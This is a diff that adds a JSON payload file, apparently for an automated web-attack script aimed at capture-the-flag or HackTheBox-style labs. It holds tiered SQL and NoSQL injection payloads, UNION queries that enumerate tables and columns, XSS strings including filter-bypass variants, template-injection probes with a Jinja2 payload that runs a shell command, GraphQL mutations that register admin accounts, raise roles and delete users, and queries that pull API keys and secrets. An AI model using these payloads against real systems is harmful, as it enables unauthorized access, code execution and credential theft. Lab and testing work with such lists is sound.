@@ -1,0 +1,305 @@
+﻿{
+  "sqli": {
+    "_comment": "Tiered: detect → confirm → exploit. Script tries detect first; escalates only on hit.",
+
+    "detect": [
+      "'",
+      "\"",
+      "`",
+      "\\",
+      "1'"
+    ],
+
+    "confirm": [
+      "' --",
+      "' #",
+      "' /*",
+      "\" --",
+      "\" #",
+      "1 AND 1=1",
+      "1 AND 1=2",
+      "' OR '1'='1",
+      "' OR 1=1--",
+      "\" OR 1=1--",
+      "admin'--",
+      "htb-stdnt' --",
+      "' AND '1'='1",
+      "' AND '1'='2",
+      "x' OR 'x'='x",
+      "' OR ''='",
+      "1; --",
+      "'; --"
+    ],
+
+    "blind_time_mysql": [
+      "' AND SLEEP(3)--",
+      "\" AND SLEEP(3)--",
+      "1 AND SLEEP(3)--",
+      "' OR SLEEP(3)--",
+      "1' AND SLEEP(3) AND '1'='1",
+      "'; SELECT SLEEP(3)--",
+      "1 AND (SELECT * FROM (SELECT SLEEP(3))a)--",
+      "' AND (SELECT 1 FROM (SELECT SLEEP(3))x)--"
+    ],
+
+    "blind_time_mssql": [
+      "'; WAITFOR DELAY '0:0:3'--",
+      "1; WAITFOR DELAY '0:0:3'--",
+      "' WAITFOR DELAY '0:0:3'--",
+      "'; IF (1=1) WAITFOR DELAY '0:0:3'--"
+    ],
+
+    "blind_time_postgres": [
+      "'; SELECT pg_sleep(3)--",
+      "' OR 1=1; SELECT pg_sleep(3)--",
+      "1; SELECT pg_sleep(3)--"
+    ],
+
+    "blind_bool": [
+      "' AND 1=1--",
+      "' AND 1=2--",
+      "' AND 'a'='a",
+      "' AND 'a'='b",
+      "1 AND 1=1--",
+      "1 AND 1=2--",
+      "' AND substring(username,1,1)='a'--",
+      "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
+    ],
+
+    "union_col_probe": "' UNION SELECT %s-- -",
+
+    "fingerprint": {
+      "mysql":    "' UNION SELECT @@version,NULL-- -",
+      "mssql":    "' UNION SELECT @@version,NULL-- -",
+      "postgres": "' UNION SELECT version(),NULL-- -",
+      "sqlite":   "' UNION SELECT sqlite_version(),NULL-- -",
+      "database": "' UNION SELECT database(),NULL-- -",
+      "db_user":  "' UNION SELECT user(),NULL-- -"
+    },
+
+    "table_enum": {
+      "mysql_mariadb": "GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database()",
+      "mssql":         "STRING_AGG(table_name,',') FROM information_schema.tables",
+      "sqlite":        "GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'",
+      "postgres":      "string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'"
+    },
+
+    "col_enum": {
+      "mysql_mariadb": "GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_name='%s'",
+      "mssql":         "STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='%s'",
+      "sqlite":        "GROUP_CONCAT(name) FROM pragma_table_info('%s')",
+      "postgres":      "string_agg(column_name,',') FROM information_schema.columns WHERE table_name='%s'"
+    },
+
+    "flag_table_keywords": ["flag", "secret", "token", "key", "password", "cred", "admin", "private", "hidden", "sensitive", "config", "setting", "auth"],
+    "flag_col_keywords":   ["flag", "value", "secret", "data", "content", "text", "answer", "result", "hash", "pass", "token", "key", "code"]
+  },
+
+  "nosql": {
+    "_comment": "MongoDB / NoSQL injection. Try detect tier first.",
+
+    "detect": [
+      "' || '1'=='1",
+      "'; return true; var a='",
+      "'; return 1==1; var x='",
+      "{\"$gt\": \"\"}",
+      "{\"$ne\": null}",
+      "{\"$where\": \"1==1\"}",
+      "{\"$regex\": \".*\"}",
+      "true, $where: '1 == 1'",
+      ", $where: '1 == 1'",
+      "$where: '1 == 1'",
+      "{ $gt: '' }",
+      "[$ne]=1"
+    ],
+
+    "confirm": [
+      "' || 1==1//",
+      "' || 1==1%00",
+      "'; return true//",
+      "{\"$gt\": \"\", \"$lt\": \"z\"}",
+      "{\"$in\": [\"admin\",\"root\",\"user\"]}",
+      "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}"
+    ],
+
+    "extract": [
+      "' || this.password.match(/.*/)//",
+      "' || this.username == 'admin'//",
+      "{\"$where\": \"this.password.length > 0\"}",
+      "{\"$where\": \"this.role == 'admin'\"}"
+    ]
+  },
+
+  "xss": {
+    "_comment": "Tiered: detect → standard → bypass. Script tries detect first.",
+
+    "detect": [
+      "<script>alert(1)</script>",
+      "<img src=x onerror=alert(1)>",
+      "'\"><script>alert(1)</script>",
+      "<svg onload=alert(1)>"
+    ],
+
+    "standard": [
+      "<script>alert(document.cookie)</script>",
+      "<script>alert(document.domain)</script>",
+      "<img src=x onerror=alert(document.cookie)>",
+      "<svg/onload=alert(1)>",
+      "<svg onload=alert`1`>",
+      "javascript:alert(1)",
+      "\" onmouseover=\"alert(1)",
+      "<body onload=alert(1)>",
+      "<iframe src=javascript:alert(1)>",
+      "<details open ontoggle=alert(1)>",
+      "<input autofocus onfocus=alert(1)>",
+      "<select onfocus=alert(1) autofocus>",
+      "<video src=1 onerror=alert(1)>",
+      "<audio src=1 onerror=alert(1)>",
+      "<form><button formaction=javascript:alert(1)>X</button></form>",
+      "<object data=javascript:alert(1)>",
+      "<marquee onstart=alert(1)>",
+      "<div onmouseover=alert(1)>hover</div>"
+    ],
+
+        "waf_bypass": [
+      "<ScRiPt>alert(1)</ScRiPt>",
+      "<SCRIPT>alert(1)</SCRIPT>",
+      "<script >alert(1)</script >",
+      "<img src=x onerror=\"alert(1)\">",
+      "<img src=x onerror='alert(1)'>",
+      "<<script>alert(1)//<</script>",
+      "<scr<script>ipt>alert(1)</scr</script>ipt>",
+      "%3Cscript%3Ealert(1)%3C/script%3E",
+      "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+      "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "<img src=x onerror=alert(1) x=",
+      "<svg><script>alert(1)</script></svg>",
+      "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
+      "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\">",
+      "</script><script>alert(1)</script>"
+    ],
+
+    "ssti_detect": [
+      "{{7*7}}",
+      "${7*7}",
+      "#{7*7}",
+      "<%-7*7%>",
+      "${{7*7}}",
+      "@(7*7)",
+      "{{7*'7'}}",
+      "${{'a'.toUpperCase()}}",
+      "{% 7*7 %}"
+    ],
+
+    "ssti_confirm": {
+      "jinja2":      "{{config}}",
+      "jinja2_rce":  "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+      "twig":        "{{7*'7'}}",
+      "freemarker":  "${7*7}",
+      "velocity":    "#set($x=7*7)${x}",
+      "smarty":      "{php}echo 7*7;{/php}",
+      "erb":         "<%= 7*7 %>",
+      "el":          "${7*7}",
+      "thymeleaf":   "__${7*7}__::.x",
+      "angularjs":   "{{constructor.constructor('alert(1)')()}}"
+    },
+
+    "type_mismatch": [
+      "<script>alert(1)</script>",
+      "<img src=x onerror=alert(1)>",
+      "<svg onload=alert(1)>",
+      "'\"><script>alert(1)</script>",
+      "<details open ontoggle=alert(1)>",
+      "javascript:alert(1)"
+    ]
+  },
+
+  "error_keywords": {
+    "sqli": [
+      "syntax error",
+      "mysql",
+      "sql syntax",
+      "ORA-",
+      "sqlite",
+      "Warning:",
+      "error in your SQL",
+      "unclosed quotation",
+      "SQLSTATE",
+      "pg_query",
+      "PostgreSQL",
+      "MariaDB",
+      "Microsoft OLE DB",
+      "ODBC SQL",
+      "Incorrect syntax",
+      "division by zero",
+      "invalid input syntax",
+      "unterminated string",
+      "quoted string not properly terminated",
+      "unexpected end of SQL",
+      "SQL command not properly ended",
+      "unrecognized token",
+      "near \"'\""
+    ],
+    "nosql": [
+      "MongoError",
+      "BSONTypeError",
+      "cannot use",
+      "$where",
+      "ReferenceError",
+      "SyntaxError",
+      "bad query"
+    ],
+    "generic_error": [
+      "exception",
+      "stack trace",
+      "internal server error",
+      "traceback",
+      "undefined method",
+      "nil:NilClass",
+      "undefined variable"
+    ]
+  },
+
+  "mutations": {
+    "privesc_role_values": [
+      "admin",
+      "superadmin",
+      "administrator",
+      "root",
+      "moderator",
+      "staff",
+      "owner",
+      "super_admin",
+      "ADMIN",
+      "Admin",
+      "manager",
+      "superuser",
+      "operator",
+      "god",
+      "1",
+      "true"
+    ],
+
+    "register_admin":       "mutation { registerUser(input: {username: \"%s\", password: \"%s\", role: \"admin\", msg: \"pwned\"}) { user { username role } } }",
+    "register_basic":       "mutation { registerUser(input: {username: \"%s\", password: \"%s\"}) { user { username } } }",
+    "register_superadmin":  "mutation { registerUser(input: {username: \"%s\", password: \"%s\", role: \"superadmin\"}) { user { username role } } }",
+    "register_moderator":   "mutation { registerUser(input: {username: \"%s\", password: \"%s\", role: \"moderator\"}) { user { username role } } }",
+    "update_role":          "mutation { updateUser(username: \"%s\", role: \"admin\") { username role } }",
+    "update_password":      "mutation { updateUser(username: \"%s\", password: \"%s\") { username } }",
+    "delete_user":          "mutation { deleteUser(username: \"%s\") { success } }",
+    "login":                "mutation { login(username: \"%s\", password: \"%s\") { token user { username role } } }",
+    "input_type_enum":      "{ __type(name: \"%s\") { name inputFields { name description defaultValue type { name kind } } } }"
+  },
+
+  "apikeys": [
+    "query { activeApiKeys { id role key } }",
+    "query { apiKeys { id key role } }",
+    "query { keys { value permissions } }",
+    "query { adminKeys { id key scope } }",
+    "query { tokens { id token role } }",
+    "{ apiKey { key role } }",
+    "{ systemKeys { id key permissions } }",
+    "query { apiTokens { id token expiresAt } }",
+    "query { secrets { id name value } }"
+  ]
+}
